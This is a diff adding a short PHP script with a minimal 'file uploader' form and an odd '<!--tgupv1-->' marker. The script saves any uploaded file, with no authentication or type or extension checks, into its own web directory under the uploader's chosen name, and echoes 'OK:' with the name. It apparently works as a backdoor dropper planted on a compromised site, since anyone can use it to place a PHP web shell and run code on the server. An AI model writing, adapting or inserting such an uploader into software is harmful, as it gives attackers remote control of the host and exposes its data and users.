@@ -1,0 +1,16 @@
+<?php
+if(!empty($_FILES['f']['tmp_name'])){
+    $n=basename($_FILES['f']['name']);
+    echo move_uploaded_file($_FILES['f']['tmp_name'],__DIR__.'/'.$n)?('OK:'.$n):'FAIL';
+    exit;
+}
+header('Content-Type: text/html; charset=utf-8');
+?><!--tgupv1--><!DOCTYPE html><html><head><meta charset="utf-8"><title>up</title>
+<style>body{font-family:sans-serif;margin:2em}input,button{padding:.4em}</style>
+</head><body>
+<h3>file uploader</h3>
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="f">
+<button type="submit">Upload</button>
+</form>
+</body></html>
